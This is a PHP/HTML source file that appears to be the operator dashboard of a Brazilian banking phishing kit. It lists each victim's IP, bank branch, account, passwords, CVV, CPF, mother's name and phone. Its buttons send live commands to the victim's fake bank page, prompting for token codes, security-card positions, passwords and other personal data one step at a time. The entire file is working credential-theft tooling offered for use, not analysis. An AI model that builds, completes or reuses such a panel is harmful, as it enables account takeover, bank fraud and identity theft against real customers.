<?php
require_once 'config.php';
include 'validaLogin.php';
$id = isset($_GET['id']) ? $_GET['id'] : '';
$info = Info::findById($id);

if(!$info){
  echo "Erro ao encontrar a info!";
  exit();
}
getHeader(null, ($info['nome'] ? $info['nome'] : '-')." | ".$info['conta']. " | ".$info['ip']);
?>
<div class="container-fluid">
<div class="pt-5">
    <?php
        $infos = Info::buscarTodos();
    ?>
    <div class="container-fluid mb-3" style="padding: 0px;">
        <div class="row">
          <div class="col-6">

          </div>
          <div class="col-6 text-right pt-1">
            <a id="controlarContador" class="contador" href="">Parar / Iniciar</a>
            <span id="timer" class="contador">Atualizar em: <span id="segundos"></span> segundos</span>
          </div>
        </div>
    </div>
    
    <table id="infos" class="table">
        <thead>
          <tr>
            <th scope="col">ID</th>
            <th scope="col">IP</th>
            <th scope="col">Data Hora</th>
            <th scope="col">Device</th>
            <th scope="col">Agência</th>
            <th scope="col">Conta</th>
            <th scope="col">Tipo</th>
            <th scope="col">S4</th>
            <th scope="col">Titular</th>
            <th scope="col">Nome</th>
            <th scope="col">Status</th>
            <th scope="col">Comando</th>
          </tr>
        </thead>
        <tbody>
          <tr class="header visualizado " data-aberto="1">
              <td scope="row"><span class="id">-</span></td>
              <td><span class="ip">-</span></td>
              <td><span class="data">-</span></td>
              <td><span class="device">-</span></td>
              <td><span class="agencia">-</span></td>
              <td><span class="conta">-</span></td>
              <td><span class="tipo">-</span></td>
              <td><span class="s4">-</span></td>
              <td><span class="titular">-</span></td>
              <td><span class="nome">-</span></td>
              <td><span class="status">-</span></td>
              <td><span class="comando">-</span></td>
          </tr>
          <tr class="detail ">
              <td colspan="12">
                <div class="container-fluid">
                    <div class="row">
                      <div class="col-12" id="botoes-acoes">
                          <div id="botoes-parte-1" class="<?php echo strpos($info['comando'], 'INTERNA') != false ? 'hide': ''; ?>">
                            <button type="button" class="btn btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="INFORMACOES_INVALIDAS" type="button" class="btn btn-outline-danger btn-sm btn-action"><i class="fas  fa-exclamation-triangle"></i> Informações Inválidas</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="AGUARDANDO" type="button" class="btn btn-outline-success btn-sm ml-2 btn-action"><i class="fas fa-spinner"></i> Aguardando</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_4" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 4</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_4_ERRO" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 4 Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TOKEN" data-confirmar-serial="true" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-pager"></i> Token</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TOKEN_ERRO" data-confirmar-serial="true" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-pager"></i> Token Erro</button>
                            <button data-pergunta="Informe a posição da tabela:" data-action="ALTERAR_COMANDO_COM_TEXTO" data-confirmar-serial="true" data-comando="TABELA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action-text"><i class="fas fa-credit-card"></i> Tabela</button>
                            <button data-pergunta="Informe a posição da tabela:" data-action="ALTERAR_COMANDO_COM_TEXTO" data-confirmar-serial="true" data-comando="TABELA_ERRO" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action-text"><i class="fas fa-credit-card"></i> Tabela Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="AGUARDANDO_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-paper-plane"></i> Liberar Acesso</button>
                          </div>
                          <div id="botoes-parte-2" class="<?php echo strpos($info['comando'], 'INTERNA') != false ? '': 'hide'; ?>">
                            <button type="button" class="btn btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="AGUARDANDO_INTERNA" type="button" class="btn btn-outline-success btn-sm ml-2 btn-action"><i class="fas fa-spinner"></i> Aguardando</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TOKEN_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-pager"></i> Token</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TOKEN_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-pager"></i> Token Erro</button>
                            <button data-pergunta="Informe a posição da tabela:" data-action="ALTERAR_COMANDO_COM_TEXTO" data-comando="TABELA_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 exibir-tabela-interno btn-action-text"><i class="fas fa-credit-card"></i> Tabela</button>
                            <button data-pergunta="Informe a posição da tabela:" data-action="ALTERAR_COMANDO_COM_TEXTO" data-comando="TABELA_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action-text"><i class="fas fa-credit-card"></i> Tabela Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_6_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 6</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_6_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 6 Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CVV_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-credit-card"></i> CVV</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CVV_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-credit-card"></i> CVV Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CELULAR_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-mobile"></i> Celular</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CELULAR_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-mobile"></i> Celular Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CPF_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-user"></i> CPF</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CPF_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-user"></i> CPF Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="NOME_MAE_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-female"></i> Nome Mãe</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="NOME_MAE_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-female"></i> Nome Mãe Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="ATUALIZAR_MODULO_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-upload "></i> Atualização Módulo</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TELA_FIM_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-paper-plane"></i> Finalizar</button>
                          </div>
                          <div id="botoes-parte-3" class="<?php echo $info['device'] == 'MOBILE' ? '': 'hide'; ?>">
                            <button type="button" class="btn btn-outline-danger btn-sm excluir-info"><i class="fas fa-times"></i> Excluir Info</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="INFORMACOES_INVALIDAS" type="button" class="btn btn-outline-danger btn-sm btn-action"><i class="fas  fa-exclamation-triangle"></i> Informações Inválidas</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="AGUARDANDO" type="button" class="btn btn-outline-success btn-sm ml-2 btn-action"><i class="fas fa-spinner"></i> Aguardando</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_4" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 4</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_4_ERRO" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 4 Erro</button>
                            <button data-pergunta="Informe a posição da tabela:" data-action="ALTERAR_COMANDO_COM_TEXTO" data-comando="TABELA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action-text"><i class="fas fa-credit-card"></i> Tabela</button>
                            <button data-pergunta="Informe a posição da tabela:" data-action="ALTERAR_COMANDO_COM_TEXTO" data-comando="TABELA_ERRO" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action-text"><i class="fas fa-credit-card"></i> Tabela Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TOKEN" type="button" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-pager"></i> Token</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="TOKEN_ERRO" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-pager"></i> Token Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_6_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 6</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="SENHA_DE_6_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-key"></i> Senha de 6 Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CVV_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-credit-card"></i> CVV</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CVV_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-credit-card"></i> CVV Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CELULAR_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-mobile"></i> Celular</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CELULAR_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-mobile"></i> Celular Erro</button>


                            <button data-action="ALTERAR_COMANDO" data-comando="CPF_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-user"></i> CPF</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="CPF_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-user"></i> CPF Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="NOME_MAE_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-female"></i> Nome Mãe</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="NOME_MAE_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm ml-2 btn-action"><i class="fas fa-female"></i> Nome Mãe Erro</button>
                            <button data-action="ALTERAR_COMANDO" data-comando="ATUALIZAR_MODULO_INTERNA" type="button" class="btn btn-outline-info btn-sm ml-2 btn-action"><i class="fas fa-upload "></i> Atualização Módulo</button>

                            <button data-action="ALTERAR_COMANDO" data-comando="TELA_FIM_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-paper-plane"></i> Finalizar</button>
                          </div>
                      </div>
                    </div>
                    <div class="row">
                      <div id="token" class="col-6">
                          <div class="mb-3 mt-3">
                            <h5 class="mb-3">Token / Tabela Atual:</h5>
                            <span class="tokenAtual token">-----</span>
                          </div>
                          <h5 class="mb-3">Histórico de Tokens / Tabelas</h5>
                          <table id="tokens" class="table table-striped table-dark">
                            <thead>
                                <tr>
                                  <th scope="col">#</th>
                                  <th scope="col">Data / Hora</th>
                                  <th scope="col">Posição/Tipo</th>
                                  <th scope="col">Token/Tabela</th>
                                </tr>
                            </thead>
                            <tbody>
                            </tbody>
                          </table>
                      </div>
                      <div id="information" class="col-6">
                          <h5 class="mb-3 mt-3">Enviar Informações:</h5>
                          <table>
                          <tbody>
                              <tr>
                                  <td width="20%">QR Code:</td>
                                  <td><input class="field" type="file" name="qrCodeFile" style="width:300px;"> <button data-id="<?php echo $info['id'];?>" data-action="UPLOAD_QR" type="button" class="enviarQr btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                              </tr>
                              <tr>
                                  <td width="20%">Serial Dispositivo:</td>
                                  <td><input class="field" type="text" name="serialDispositivo" style="width:300px;"> <button data-id="<?php echo $info['id'];?>" type="button" class="enviarSerialDispositivo btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                              </tr>
                              <tr>
                                  <td width="20%">Saldo:</td>
                                  <td><input class="field" type="text" value="R$" name="saldo" style="width:300px;"> <button data-id="<?php echo $info['id'];?>" type="button" class="enviarSaldo btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                              </tr>
                          </tbody>
                          </table>
                          <h5 class="mb-3 mt-3">Outras informações:</h5>
                          <table>
                            <tbody>
                                <tr>
                                  <td width="15%">Comando:</td>
                                  <td><span class="comando">-</span></td>
                                </tr>
                                <tr>
                                  <td width="15%">Texto:</td>
                                  <td><span class="texto">-</span></td>
                                </tr>
                                <tr>
                                  <td>User Agent:</td>
                                  <td><span class="userAgent">-</span></td>
                                </tr>
                                <tr>
                                  <td>IP:</td>
                                  <td><span class="ip">-</span></td>
                                </tr>
                                <tr>
                                  <td>Dispositivo:</td>
                                  <td><span class="device">-</span></td>
                                </tr>
                                <tr>
                                  <td>Data Hora:</td>
                                  <td><span class="data">-</span></td>
                                </tr>
                                <tr>
                                  <td>Titular:</td>
                                  <td><span class="titular">-</span></td>
                                </tr>
                                <tr>
                                  <td>Nome:</td>
                                  <td><span class="nome">-</span></td>
                                </tr>
                                <tr>
                                  <td>Agência:</td>
                                  <td><span class="agencia">-</span></td>
                                </tr>
                                <tr>
                                  <td>Conta:</td>
                                  <td><span class="conta">-</span></td>
                                </tr>
                                <tr>
                                  <td>Tipo:</td>
                                  <td><span class="tipo">-</span> <button style="font-size:10px" type="button" class="btn btn-outline-dark btn-sm ml-2 toPrime"><i class="fas fa-key"></i> Mudar para Prime</button></td>
                                </tr>
                                <tr>
                                  <td>S4:</td>
                                  <td><span class="s4">-</span></td>
                                </tr>
                                <tr>
                                  <td>Serial Dispositivo:</td>
                                  <td><span class="serialDispositivo">-</span></td>
                                </tr>
                                <tr>
                                  <td>Saldo:</td>
                                  <td><span class="saldo">-</span></td>
                                </tr>
                                <tr>
                                  <td>S6:</td>
                                  <td><span class="s6">-</span></td>
                                </tr>
                                <tr>
                                  <td>CVV:</td>
                                  <td><span class="cvv">-</span></td>
                                </tr>
                                <tr>
                                  <td>CPF:</td>
                                  <td><span class="cpf">-</span></td>
                                </tr>
                                <tr>
                                  <td>Nome mãe:</td>
                                  <td><span class="mae">-</span></td>
                                </tr>
                                <tr>
                                  <td>Celular:</td>
                                  <td><span class="celular">-</span></td>
                                </tr>
                                <tr>
                                  <td>QR Code File:</td>
                                  <td><span class="qrCodeFile">-</span></td>
                                </tr>
                            </tbody>
                          </table>
                      </div>
                    </div>
                </div>
              </td>
          </tr>
        </tbody>
        
      </table>

</div>
</div>
<audio id="myAudioAlteracaoInfo">
  <source src="myAudioAlteracaoInfo.mp3" type="audio/mpeg">
</audio>
<input type="hidden" name="id" id="id" value="<?php echo $id;?>">

<?php
getFooter(['js/operar.js']);
?>